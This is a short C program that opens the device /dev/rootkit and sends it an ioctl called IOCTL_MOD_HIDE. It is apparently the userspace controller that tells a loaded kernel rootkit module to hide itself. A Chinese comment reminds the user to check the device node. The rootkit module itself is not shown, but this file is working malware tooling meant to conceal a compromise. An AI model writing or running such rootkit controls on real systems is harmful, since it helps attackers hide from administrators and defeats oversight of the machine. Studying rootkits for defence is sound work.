#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define MAGIC 'k'
#define IOCTL_MOD_HIDE _IO(MAGIC, 0)

int main() {
    int fd = open("/dev/rootkit", O_RDONLY);  // 確保設備節點正確
    if (fd < 0) {
        perror("open");
        return 1;
    }

    if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
        perror("ioctl");
        return 1;
    }

    close(fd);
    return 0;
}
